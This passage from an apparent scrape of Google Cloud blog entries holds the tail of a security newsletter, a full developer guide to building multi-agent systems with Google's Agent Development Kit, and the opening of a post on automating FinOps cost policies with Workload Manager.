href=\"https://cloud.google.com/blog/topics/threat-intelligence/privileged-account-monitoring\"><b>Read more</b></a><b>.</b></li><li><b>Pro-Russia information operations leverage Russian drone incursions into Polish airspace</b>: GTIG has observed multiple instances of pro-Russia information operations (IO) actors promoting narratives related to the reported incursion of Russian drones into Polish airspace that occurred in September. The IO activity appeared consistent with previously-observed instances of pro-Russia IO targeting Poland — and more broadly the NATO Alliance and the West. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions\"><b>Read more</b></a><b>.</b></li><li><b>Vietnamese actors using fake job posting campaigns to deliver malware and steal credentials</b>: GTIG is tracking a cluster of financially-motivated threat actors operating from Vietnam that use fake job postings on legitimate platforms to target individuals in the digital advertising and marketing sectors. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vietnamese-actors-fake-job-posting-campaigns\"><b>Read more</b></a><b>.</b></li></ul><p>Please visit the Google Cloud blog for more threat intelligence stories <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/\">published this month</a>.</p></div>\n<div class=\"block-paragraph\"><h3><b>Now hear this: Podcasts from Google Cloud</b></h3><ul><li><b>The end of ‘collect everything’: Moving from centralization to data access</b>: Will the next big SIEM and SOC cost-savings come from managing security data access? Balazs Scheidler, CEO, Axoflow, and founder of syslog-ng, debates the future of security data with hosts Anton Chuvakin and Tim Peacock. <a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep249-data-first-what-really-makes-your-soc-ai-ready/\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Cyber Savvy Boardroom: Valuing investment beyond the balance sheet</b>: Andreas Wuchner, cybersecurity and risk expert, and board advisor, shares his perspective on how smart investments can transform risk management into a brand promise. <a href=\"https://cybersavvyboardroom.libsyn.com/ep9-andreas-wuchner-on-beyond-the-balance-sheet-valuing-cyber-investment\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Behind the Binary: Building a robust network at Black Hat</b>: Host Josh Stroschein is joined by Mark Overholser, a technical marketing engineer, Corelight, who also helps run the Black Hat Network Operations Center (NOC). He gives us an insider’s look at the philosophy and challenges behind building a robust network for a security conference. <a href=\"https://www.youtube.com/watch?v=YNjEqSVZRPw&amp;list=PLjiTz6DAEpuLAykjYGpAUDL-tCrmTpXTf\" target=\"_blank\"><b>Listen here</b></a>.</li></ul><p>To have our Cloud CISO Perspectives post delivered twice a month to your inbox, <a href=\"https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup\">sign up for our newsletter</a>. We’ll be back in a few weeks with more security-related updates from Google Cloud.</p></div>",
        "published_date": "2025-11-05 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/building-collaborative-ai-a-developers-guide-to-multi-agent-systems-with-adk/",
        "title": "Building Collaborative AI: A Developer's Guide to Multi-Agent Systems with ADK",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/A_Developers_Guide_to_Multi-Agent_Systems_wi.max-600x600.png",
        "author": "Annie Wang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">If you’ve ever wondered how multiple AI agents can actually work together to solve problems too complex for a single agent, you're in the right place. This guide, based on our two-part video series, will walk you through the foundational concepts of </span><a href=\"https://google.github.io/adk-docs/agents/multi-agents/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Multi-Agent Systems (MAS)</span></a><span style=\"vertical-align: baseline;\"> and show you how </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google’s Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\"> makes building them easier for developers.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=pX0_iIfRilU\">\n\n      \n        <img alt=\"A YouTube video discussion the foundations of a multi-agent system\" src=\"https://img.youtube.com/vi/pX0_iIfRilU/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=pX0_iIfRilU\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=WfJcCeLZD2I\">\n\n      \n        <img alt=\"A YouTube video explaining workflow agents and communication\" src=\"https://img.youtube.com/vi/WfJcCeLZD2I/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=WfJcCeLZD2I\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">By the end of this post, you’ll understand what multi-agent systems are, how to structure them, and how to enable communication between your agents using </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's dive in.</span></p>\n<h2><span style=\"vertical-align: baseline;\">What Is a Multi-Agent System?</span></h2>\n<p><span style=\"vertical-align: baseline;\">At its core, a <strong>multi-agent system</strong> is a collection of individual, autonomous agents that collaborate to achieve a goal. To truly grasp this, let's break it down into three key ideas:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Decentralized Control</strong><span style=\"vertical-align: baseline;\">: There’s no single “boss” agent controlling everything. Each agent makes its own decisions based on its own rules and local information. Think of a flock of birds swirling in the sky, there's no leader, but together they form incredible, coordinated patterns.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Local Views</strong><span style=\"vertical-align: baseline;\">: Each agent only has a partial view of the system. It perceives and reacts to its immediate environment, not the entire system state. Imagine standing in a crowded stadium; you only see and react to the people directly around you, not the entire crowd simultaneously.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Emergent Behavior</strong><span style=\"vertical-align: baseline;\">: This is where the magic happens. From these simple, local interactions, complex and intelligent global behaviors emerge. Agents working together in this way can solve tasks that no single agent could easily accomplish alone.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"8\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/8_bSozdwl.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This collaborative approach allows for robust, scalable, and flexible solutions to complex problems.</span></p>\n<h2><span style=\"vertical-align: baseline;\">How ADK Supports Multi-Agent Systems</span></h2>\n<p><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google’s Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\"> was built from the ground up with multi-agent systems in mind. Instead of forcing you to hack different components together, it provides a structured framework with three primary types of agents, each with a specific role:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"7\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/7_fe519aX.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/llm-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">LLM Agents</strong></a><span style=\"vertical-align: baseline;\">: These are the “brains” of the operation. They leverage large language models like Gemini to understand natural language input, reason through problems, and decide on the next course of action.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">Workflow Agents</strong></a><span style=\"vertical-align: baseline;\">: These are the “managers” that orchestrate how tasks get done. They don’t perform the work themselves but instead direct the flow of execution among other agents. We'll explore these in detail later.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/custom-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">Custom Agents</strong></a><span style=\"vertical-align: baseline;\">: These are the “specialists.” When you need full control or specific logic that doesn’t fit the other agent types, you can write your own Python code by inheriting from </span><code style=\"vertical-align: baseline;\">BaseAgent</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">The Foundational Concept: Agent Hierarchy</span></h3>\n<p><span style=\"vertical-align: baseline;\">When you build with ADK, agents are organized into a hierarchy, much like a company's organizational chart. This structure is the backbone of your system and is governed by two simple rules:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Parent &amp; Sub-Agents</strong><span style=\"vertical-align: baseline;\">: A parent agent can manage one or more sub-agents, delegating tasks to them.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Single Parent Rule</strong><span style=\"vertical-align: baseline;\">: Each agent can have only one parent, ensuring a clear line of command and data flow.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (2)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Think of it like this: the </span><strong style=\"vertical-align: baseline;\">root agent</strong><span style=\"vertical-align: baseline;\"> is the CEO, who oversees the entire operation. Its </span><strong style=\"vertical-align: baseline;\">sub-agents</strong><span style=\"vertical-align: baseline;\"> might be VPs, who in turn manage directors, managers, and individual contributors. Everyone has a defined role, and together they accomplish the company's mission. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/d_routing_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">This hierarchical structure is fundamental to organizing and scaling your multi-agent system.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Orchestrating Tasks with Workflow Agents</span></h2>\n<p><span style=\"vertical-align: baseline;\">So, we have a hierarchy. But how do we control the </span><span style=\"font-style: italic; vertical-align: baseline;\">flow</span><span style=\"vertical-align: baseline;\"> of work within that structure? This is where Workflow Agents shine. ADK provides three pre-built orchestrators to manage sub-agents:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/sequential-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">SequentialAgent</strong></a><span style=\"vertical-align: baseline;\">: This agent functions like an assembly line. It runs its sub-agents one after another, in a predefined order. The output of one agent can be passed as the input to the next, making it perfect for multi-step pipelines like: </span><code style=\"vertical-align: baseline;\">fetch data → clean data → analyze data → summarize findings</code><span style=\"vertical-align: baseline;\">. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/b1_sequential_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (6)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_6.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/parallel-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ParallelAgent</strong></a><span style=\"vertical-align: baseline;\">: This agent acts like a manager assigning tasks to multiple employees at once. It runs all its sub-agents concurrently, which is ideal for independent tasks that can be performed simultaneously, such as calling three different APIs to gather information. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/b2_parallel_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (7)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_7.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/loop-agents/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">LoopAgent</strong></a><span style=\"vertical-align: baseline;\">: This agent works like a </span><code style=\"vertical-align: baseline;\">while</code><span style=\"vertical-align: baseline;\"> loop in programming. It repeatedly executes its sub-agents until a specific condition is met or a maximum number of iterations is reached. This is useful for tasks like polling an API for a status update or retrying an operation until it succeeds. See example <a href=\"https://github.com/cuppibla/adk_tutorial/blob/main/b3_loop_agent/agents.py\" rel=\"noopener\" target=\"_blank\">here</a>.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/6_zyKwPKJ.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Using these workflow agents, you can build complex and dynamic execution paths without getting lost in boilerplate code.</span></p>\n<h2><span style=\"vertical-align: baseline;\">How Do Agents Communicate?</span></h2>\n<p><span style=\"vertical-align: baseline;\">We have our structure and our managers. The final piece of the puzzle is communication. How do agents actually share information and delegate work? ADK provides three primary communication mechanisms.</span></p>\n<h3>Shared Session State</h3>\n<p><strong style=\"vertical-align: baseline;\">Shared Session State </strong>is like a<span style=\"vertical-align: baseline;\"> shared digital whiteboard. An agent can write its result to a common </span><code style=\"vertical-align: baseline;\">state</code><span style=\"vertical-align: baseline;\"> object, and other agents in the hierarchy can read that information to inform their own actions. For example, an </span><code style=\"vertical-align: baseline;\">LLMAgent</code><span style=\"vertical-align: baseline;\"> can analyze user input and save the key entities to the state, allowing a </span><code style=\"vertical-align: baseline;\">CustomAgent</code><span style=\"vertical-align: baseline;\"> to then use those entities to query a database.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (9)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_9.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">LLM-Driven Delegation</span></h3>\n<p><strong style=\"vertical-align: baseline;\">LLM-Driven Delegation </strong><span style=\"vertical-align: baseline;\">is a more dynamic and intelligent form of communication. A parent agent (often an </span><code style=\"vertical-align: baseline;\">LLMAgent</code><span style=\"vertical-align: baseline;\">) can act as a coordinator. It analyzes the incoming request and uses its reasoning capabilities to decide which of its sub-agents is best suited to handle the task. For instance, if a user asks to \"generate an invoice for last month,\" the coordinator agent can dynamically route the request to a specialized </span><code style=\"vertical-align: baseline;\">BillingAgent</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (10)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_10.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Explicit Invocation (AgentTool)</span></h3>\n<p><strong style=\"vertical-align: baseline;\">Explicit Invocation (AgentTool) </strong>describes a pattern where<span style=\"vertical-align: baseline;\"> one agent can directly call another agent as if it were a function. This is achieved by wrapping the target agent as a \"tool\" that the parent agent can choose to invoke. For example, a primary analysis agent might call a </span><code style=\"vertical-align: baseline;\">CalculatorAgent</code><span style=\"vertical-align: baseline;\"> tool whenever it encounters a task requiring precise mathematical calculations.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (11)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_11.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">It's important to understand the distinction between a sub-agent and an AgentTool:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A </span><strong style=\"vertical-align: baseline;\">Sub-Agent</strong><span style=\"vertical-align: baseline;\"> is a permanent part of the hierarchy—an employee on the org chart, always managed by its parent.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An </span><strong style=\"vertical-align: baseline;\">AgentTool</strong><span style=\"vertical-align: baseline;\"> is like an external consultant. You call on them when you need their specific expertise, but they aren't part of your core team structure.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mutliagent_blog_visual (12)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mutliagent_blog_visual_12.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Wrapping up</span></h2>\n<p><span style=\"vertical-align: baseline;\">Let’s quickly recap what we've covered:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Multi-Agent Systems</strong><span style=\"vertical-align: baseline;\"> are powerful because they use decentralized control and local views to produce complex, emergent behaviors.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ADK</strong><span style=\"vertical-align: baseline;\"> provides a robust framework with three agent categories: </span><strong style=\"vertical-align: baseline;\">LLM</strong><span style=\"vertical-align: baseline;\"> (brains), </span><strong style=\"vertical-align: baseline;\">Workflow</strong><span style=\"vertical-align: baseline;\"> (managers), and </span><strong style=\"vertical-align: baseline;\">Custom</strong><span style=\"vertical-align: baseline;\"> (specialists).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent Hierarchy</strong><span style=\"vertical-align: baseline;\"> provides the organizational structure for your system, defining clear parent-child relationships.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Workflow Agents</strong><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">Sequential</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">Parallel</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">Loop</code><span style=\"vertical-align: baseline;\">) give you the patterns to orchestrate complex task flows.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Communication Mechanisms</strong><span style=\"vertical-align: baseline;\"> (</span><strong style=\"vertical-align: baseline;\">Shared State</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">Delegation</strong><span style=\"vertical-align: baseline;\">, and </span><strong style=\"vertical-align: baseline;\">Explicit Invocation</strong><span style=\"vertical-align: baseline;\">) allow your agents to collaborate effectively.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Together, these concepts make your multi-agent systems not just structured, but truly collaborative, flexible, and intelligent. Now you have the foundational knowledge to start building your own multi-agent applications with ADK. You can start coding the following tutorial </span><a href=\"https://codelabs.developers.google.com/onramp/instructions#1\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">!</span></p>\n<h2><span style=\"vertical-align: baseline;\">Resources</span></h2>\n<p><span style=\"vertical-align: baseline;\">ADK Doc: </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://google.github.io/adk-docs/</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">ADK Sample: </span><a href=\"https://github.com/google/adk-samples\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://github.com/google/adk-samples</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">ADK Codelab: </span><a href=\"https://codelabs.developers.google.com/onramp/instructions#0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://codelabs.developers.google.com/onramp/instructions#0</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">ADK Multiagent Examples: </span><a href=\"https://github.com/cuppibla/adk_tutorial/tree/main\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://github.com/cuppibla/adk_tutorial/tree/main</span></a></p>\n<h2><span style=\"vertical-align: baseline;\">Connect with me</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Annie Wang → </span><a href=\"https://www.linkedin.com/in/anniewangtech/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/anniewangtech\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-05 08:33:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/cost-management/automate-financial-governance-policies-using-workload-manager/",
        "title": "Automating FinOps cost management policies using Workload Manager",
        "thumbnail": null,
        "author": "Omkar Suram",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Do you find yourself battling surprise cloud bills? Do you spend more time tracking down un-tagged resources and chasing development teams than you do on strategic financial planning? In the fast-paced world of cloud, manual cost management is a losing game. It’s time-consuming, prone to errors, and often, by the time you’ve identified a cost anomaly, it's too late to prevent the impact. </span></p>\n<p><span style=\"vertical-align: baseline;\">What if you could codify your financial governance policies and automate their enforcement across your entire Google Cloud organization? Enter Workload Manager (WLM), a powerful tool that lets you automate the validation of your cloud workloads against best practices for security and compliance, including your own custom-defined FinOps rules. Better yet, we recently slashed the cost of using Workload Manager by up to 95% for certain scenarios, letting you run large-scale scans more economically, including a small free tier to help you run small-scale tests. In this blog, we show you how to get started with automated financial governance policies in Workload Manager, so you can stop playing catch-up and start proactively managing your cloud spend.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge with manual FinOps</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Managing business-critical workloads in the cloud is complex. Staying on top of cost-control best practices is a significant and time-consuming effort. Manual reviews and audits can take weeks or even months to complete, by which time costs can spiral. This manual approach often leads to \"configuration drift,\" where systems deviate from your established cost management policies, making it difficult to detect and control spending.</span></p>\n<p><span style=\"vertical-align: baseline;\">Workload Manager helps you break free from these manual constraints by providing a framework for automated, continuous validation, helping FinOps teams to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Improve standardization:</strong><span style=\"vertical-align: baseline;\"> Decouple team dependencies and drive consistent application of cost-control policies across the organization.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enable ownership:</strong><span style=\"vertical-align: baseline;\"> Empower individual teams to build and manage their own detection rules for specific use cases, fostering a culture of financial accountability.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplify auditing:</strong><span style=\"vertical-align: baseline;\"> Easily run infrastructure checks across your entire organization and consolidate the findings into a single BigQuery dataset for streamlined reporting and analysis.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">By codifying your FinOps policies, you can define them once and run continuous scans to detect violations across your entire cloud environment on a regular schedule.</span></p>\n<p><span style=\"vertical-align: baseline;\">Workload Manager makes this easy, providing you with out-of-the-box rules across Security, Cost, Reliability etc. Here are some examples of FinOps cost management policies that can be automated with Workload Manager:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Must have required label or tag for a specific google cloud resource (eg: BigQuery dataset)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enforce lifecycle management or autoclass configuration for every cloud storage bucket</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ensure appropriate data retention is set for storage (eg: BigQuery tables)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Disable simultaneous multi-threading to optimize licensing costs (eg: SQL Server)</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Figure - 1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_-_1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure - 1: Default Workload Manager policies as per Google Cloud best practices</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Don't find what you need? You can always build your own custom policies using examples in our Git repo.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let’s take a closer look. </span></p>\n<h3><strong 